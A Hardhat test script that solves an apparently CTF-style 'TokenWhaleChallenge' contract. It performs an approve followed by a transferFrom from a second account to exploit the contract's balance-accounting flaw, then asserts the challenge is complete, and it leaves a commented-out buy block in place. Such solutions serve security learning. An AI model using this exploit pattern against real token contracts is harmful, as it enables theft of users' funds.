import { ethers } from "hardhat";
import { Contract, BigNumber } from "ethers";
import { expect } from "chai";
import { getContract } from "../utiils";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

let contract: Contract;
let deployer : SignerWithAddress
let receiver : SignerWithAddress

before(async () => {
    const accounts = await ethers.getSigners();
    [deployer,receiver] = accounts;
    const challengeFactory = await ethers.getContractFactory("TokenWhaleChallenge")
    const network = await (await ethers.provider.getNetwork()).name
    if (network === "ropsten") {
        contract = await challengeFactory.attach("0xb35fE8bc0b68122F6BF581fd7C7532Ea4cCdBCE4")
    } else {
        contract = await challengeFactory.deploy(deployer.getAddress(), {
            value:0,
        });
    }
});

it("solves the challenge", async function () {

    const approveTx = await contract.approve(receiver.getAddress(), 1);
    const approveTxHash = approveTx && approveTx.hash
    expect(approveTxHash).to.not.be.undefined

    const checkApprovalTx = await contract.allowance(deployer.getAddress(),receiver.getAddress())
    console.log(checkApprovalTx.toString())

    console.log("deployer " + await deployer.getAddress())
    console.log("receiver " + await receiver.getAddress())
    contract = await contract.connect(receiver)
    console.log("signer " +  await contract.signer.getAddress())
    
    const transferTx = await contract.transferFrom(deployer.getAddress(), receiver.getAddress(), 1)
    const transferTxHash = transferTx && transferTx.hash
    expect(transferTxHash).to.not.be.undefined

    const balanceTx = await contract.balanceOf(receiver.getAddress())
    console.log(balanceTx.toString())
    const balanceDeployerTx = await contract.balanceOf(deployer.getAddress())
    console.log(balanceDeployerTx.toString())

    // const buyTx = await contract.buy(tokens, {
    //     value: eth,
    // });
    // const buyTxHash = buyTx && buyTx.hash
    // expect(buyTxHash).to.not.be.undefined


    const isComplete = await contract.isComplete()
    expect(isComplete).to.be.true;
});